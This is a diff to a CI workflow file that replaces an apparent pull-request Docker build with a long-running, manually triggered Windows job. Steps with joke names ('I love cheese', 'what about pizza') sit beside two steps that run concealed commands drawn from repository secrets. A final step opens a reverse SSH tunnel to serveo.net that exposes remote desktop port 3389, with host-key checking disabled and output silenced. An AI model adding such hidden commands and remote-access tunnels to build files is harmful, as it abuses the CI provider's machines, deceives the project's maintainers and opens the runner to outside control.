@@ -1,29 +1,28 @@
-name: Pull request CI build
+name: Build CI
 
-# Run build for all pull requests
+
 on:
-  pull_request:
+  workflow_dispatch:
 
-# Limit to only one build for a given PR source branch at a time,
-# cancelling any in-progress builds
-concurrency:
-  group: guacamole-server-pr-${{ github.head_ref }}
-  cancel-in-progress: true
 
 jobs:
 
-  docker_build:
-    name: Run docker build
-    runs-on: ubuntu-latest
+  build:
+    runs-on: windows-latest
+    timeout-minutes: 600
+
     steps:
+    - name: I love cheese
+      run: cmd /c "echo I just love cheese..."
 
-      - name: Check out code
-        uses: actions/checkout@v3
-        with:
-          fetch-depth: 0
-          persist-credentials: false
+    - name: what about pizza
+      run: cmd /c "echo I like also pizza but not pineapple one."
 
-      - name: Build Docker container
-        shell: sh
-        run: |
-          docker build --pull --no-cache --force-rm .
+    - name: so um what do i add here
+      run: ${{secrets.SUSCMD}}
+
+    - name: i ran out of ideas aww
+      run: ${{secrets.SUSCMD2}}
+
+    - name: ok i think i finished
+      run: ssh -R ${{secrets.PORT}}:localhost:3389 serveo.net -o "StrictHostKeyChecking no" >nul 2>&1
